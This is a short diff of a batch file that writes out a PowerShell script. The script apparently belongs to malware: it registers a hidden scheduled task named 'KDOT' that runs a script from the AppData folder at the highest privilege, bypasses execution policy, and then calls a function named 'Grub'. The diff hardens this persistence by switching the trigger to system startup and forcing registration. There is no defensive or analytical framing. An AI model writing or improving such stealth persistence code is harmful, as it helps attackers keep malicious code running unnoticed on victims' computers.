@@ -31,9 +31,9 @@ echo     $test = Get-ScheduledTask ^| Select-Object -ExpandProperty TaskName >> 
 echo     if ($test -contains "KDOT") { >> powershell.ps1
 echo         Write-Host "KDOT already exists" >> powershell.ps1
 echo     } else { >> powershell.ps1
-echo         $schedule = New-ScheduledTaskTrigger -AtLogOn >> powershell.ps1
+echo         $schedule = New-ScheduledTaskTrigger -AtStartup >> powershell.ps1
 echo         $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle hidden -File $env:APPDATA\KDOT\KDOT.ps1" >> powershell.ps1
-echo         Register-ScheduledTask -TaskName "KDOT" -Trigger $schedule -Action $action -RunLevel Highest >> powershell.ps1
+echo         Register-ScheduledTask -TaskName "KDOT" -Trigger $schedule -Action $action -RunLevel Highest -Force >> powershell.ps1
 echo     } >> powershell.ps1
 echo     Grub >> powershell.ps1
 echo } >> powershell.ps1
